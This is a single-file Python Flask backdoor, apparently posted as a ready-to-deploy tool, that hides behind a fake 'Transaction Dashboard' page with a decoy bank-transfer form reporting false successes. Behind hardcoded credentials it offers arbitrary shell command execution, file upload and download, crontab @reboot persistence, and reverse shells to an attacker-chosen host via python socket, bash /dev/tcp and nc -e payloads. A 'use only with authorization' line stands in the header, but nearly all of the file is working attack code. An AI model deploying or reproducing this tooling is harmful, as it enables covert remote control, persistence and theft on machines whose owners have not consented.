#!/usr/bin/env python3
"""
    Backdoor Dashboard - All-in-One Backend + Frontend
    GitHub Repo: single file deployment.
    Features: RCE, File Upload/Download, Persistence, Reverse Shell, Fake Transaction Decoy.
    USE ONLY WITH AUTHORIZATION.
"""

import os
import sys
import subprocess
import secrets
import shutil
import threading
from flask import Flask, request, jsonify, render_template_string, session, send_file, redirect, url_for

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Hardcoded credentials (change in production)
USERNAME = "admin"
PASSWORD = "backdo0r"

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ──────────────────── HTML FRONTEND (embedded) ────────────────────
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Transaction Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
body{background:#0f172a;color:#e2e8f0;padding:2rem}
.container{max-width:900px;margin:auto}
h1{color:#38bdf8;margin-bottom:1rem}
input,textarea,button,select{width:100%;padding:0.8rem;margin:0.5rem 0;border-radius:8px;border:1px solid #334155;background:#1e293b;color:white}
button{background:#2563eb;cursor:pointer;font-weight:bold}
.card{background:#1e293b;padding:1.5rem;border-radius:12px;margin:1rem 0}
.output{background:#0f172a;padding:1rem;border-radius:6px;min-height:100px;white-space:pre-wrap;font-family:monospace}
.hidden{display:none}
.tab{display:inline-block;padding:0.5rem 1rem;background:#334155;color:white;cursor:pointer;border-radius:6px 6px 0 0}
.tab.active{background:#2563eb}
.tab-content{display:none}
.tab-content.active{display:block}
</style>
</head>
<body>
<div class="container">
<h1>💰 Transaction Dashboard</h1>
<div id="login">
  <div class="card">
    <h2>Login</h2>
    <input type="text" id="user" placeholder="Username">
    <input type="password" id="pass" placeholder="Password">
    <button onclick="login()">Sign In</button>
    <p id="loginErr" style="color:#f87171;"></p>
  </div>
</div>
<div id="dashboard" class="hidden">
  <div class="card">
    <div id="tabs">
      <span class="tab active" onclick="switchTab('cmd')">🖥️ Terminal</span>
      <span class="tab" onclick="switchTab('files')">📁 Files</span>
      <span class="tab" onclick="switchTab('persist')">🔁 Persistence</span>
      <span class="tab" onclick="switchTab('rshell')">🕷️ Reverse Shell</span>
      <span class="tab" onclick="switchTab('transfer')">💸 Transfer</span>
    </div>
    <!-- Terminal -->
    <div id="cmd" class="tab-content active">
      <h2>Command Execution</h2>
      <input type="text" id="cmdIn" placeholder="e.g. ls -la">
      <button onclick="execCmd()">Run</button>
      <div class="output" id="cmdOut"></div>
    </div>
    <!-- Files -->
    <div id="files" class="tab-content">
      <h2>File Manager</h2>
      <input type="file" id="fileUpload">
      <button onclick="uploadFile()">Upload</button>
      <button onclick="listFiles()">Refresh File List</button>
      <div class="output" id="fileOut"></div>
    </div>
    <!-- Persistence -->
    <div id="persist" class="tab-content">
      <h2>Persistence</h2>
      <p>Add this tool to startup (Linux only).</p>
      <button onclick="installPersistence()">Install Persistence</button>
      <div class="output" id="persistOut"></div>
    </div>
    <!-- Reverse Shell -->
    <div id="rshell" class="tab-content">
      <h2>Reverse Shell</h2>
      <input type="text" id="rhost" placeholder="LHOST (attacker IP)">
      <input type="number" id="rport" placeholder="LPORT" value="4444">
      <button onclick="spawnShell()">Spawn Reverse Shell</button>
      <div class="output" id="rshellOut"></div>
    </div>
    <!-- Transfer -->
    <div id="transfer" class="tab-content">
      <h2>Bank Transfer</h2>
      <input type="text" id="recipient" placeholder="Recipient account">
      <input type="number" id="amount" placeholder="Amount (USD)">
      <button onclick="sendTransfer()">Send Transfer</button>
      <div class="output" id="transferOut"></div>
    </div>
  </div>
</div>
</div>
<script>
let token='';
function login() {
  fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('user').value,password:document.getElementById('pass').value})})
  .then(r=>r.json()).then(d=>{if(d.success){token=d.token;document.getElementById('login').classList.add('hidden');document.getElementById('dashboard').classList.remove('hidden')}else{document.getElementById('loginErr').textContent='Invalid credentials'}})
}
function api(endpoint,data) {
  return fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...data,token})}).then(r=>r.json())
}
function execCmd(){const cmd=document.getElementById('cmdIn').value;api('/api/exec',{cmd}).then(d=>document.getElementById('cmdOut').textContent=d.output||d.error)}
function uploadFile(){const f=document.getElementById('fileUpload').files[0];if(!f)return;const fd=new FormData();fd.append('file',f);fd.append('token',token);fetch('/api/upload',{method:'POST',body:fd}).then(r=>r.json()).then(d=>alert(d.msg||d.error))}
function listFiles(){api('/api/list',{}).then(d=>{if(d.files)document.getElementById('fileOut').textContent=d.files.join('\n');else document.getElementById('fileOut').textContent=d.error})}
function downloadFile(name){window.location.href='/api/download/'+name+'?token='+token}
function installPersistence(){api('/api/persist',{}).then(d=>document.getElementById('persistOut').textContent=d.msg||d.error)}
function spawnShell(){const host=document.getElementById('rhost').value;const port=document.getElementById('rport').value;api('/api/reverseshell',{lhost:host,lport:port}).then(d=>document.getElementById('rshellOut').textContent=d.msg||d.error)}
function sendTransfer(){const r=document.getElementById('recipient').value;const a=document.getElementById('amount').value;api('/api/transfer',{recipient:r,amount:a}).then(d=>document.getElementById('transferOut').textContent=d.msg||d.error)}
function switchTab(t){document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active'));document.querySelector(`.tab[onclick="switchTab('${t}')"]`).classList.add('active');document.getElementById(t).classList.add('active')}
</script>
</body>
</html>"""

# ──────────────────── API ENDPOINTS ────────────────────

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    if data.get('username') == USERNAME and data.get('password') == PASSWORD:
        session['token'] = 'valid'
        return jsonify({'success': True, 'token': 'valid'})
    return jsonify({'success': False}), 401

def check_auth():
    data = request.get_json(silent=True) or request.form.to_dict()
    token = data.get('token') or request.args.get('token')
    if token and session.get('token') == 'valid':
        return True
    return False

@app.route('/api/exec', methods=['POST'])
def api_exec():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    data = request.get_json()
    cmd = data.get('cmd', '')
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return jsonify({'output': output.strip() or '(no output)'})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/upload', methods=['POST'])
def api_upload():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    path = os.path.join(UPLOAD_FOLDER, f.filename)
    f.save(path)
    return jsonify({'msg': f'Uploaded {f.filename}'})

@app.route('/api/list', methods=['POST'])
def api_list():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    files = os.listdir(UPLOAD_FOLDER)
    return jsonify({'files': files})

@app.route('/api/download/<filename>', methods=['GET'])
def api_download(filename):
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    path = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.isfile(path):
        return send_file(path, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/persist', methods=['POST'])
def api_persist():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    try:
        # Get absolute path to this script
        script_path = os.path.abspath(sys.argv[0])
        # Add to crontab (runs on reboot)
        cron_line = f"@reboot cd {os.getcwd()} && python3 {script_path} &\n"
        # Append to current user's crontab
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True, check=True)
        # Also create a systemd service as backup (optional)
        return jsonify({'msg': '✅ Persistence installed (crontab @reboot).'})
    except Exception as e:
        return jsonify({'error': f'Failed: {str(e)}'})

@app.route('/api/reverseshell', methods=['POST'])
def api_reverseshell():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    data = request.get_json()
    lhost = data.get('lhost', '')
    lport = data.get('lport', '4444')
    if not lhost:
        return jsonify({'error': 'LHOST required'}), 400
    # Spawn in a thread to avoid blocking
    def _shell():
        try:
            # Attempt several payloads
            payloads = [
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                f"nc -e /bin/sh {lhost} {lport}",
            ]
            for p in payloads:
                subprocess.Popen(p, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    threading.Thread(target=_shell, daemon=True).start()
    return jsonify({'msg': f'🕷️ Reverse shell spawned to {lhost}:{lport}. Check your listener.'})

@app.route('/api/transfer', methods=['POST'])
def api_transfer():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 403
    data = request.get_json()
    recipient = data.get('recipient', '')
    amount = data.get('amount', 0)
    # Fake transaction log
    print(f"[TRANSFER] ${amount} to {recipient}")
    return jsonify({'msg': f'✅ Successfully transferred ${amount} to {recipient}'})

# ──────────────────── MAIN ────────────────────

if __name__ == '__main__':
    print("""
    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
    ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    All-in-One Backdoor Dashboard - listener on port 5000
    """)
    app.run(host='0.0.0.0', port=5000, debug=False)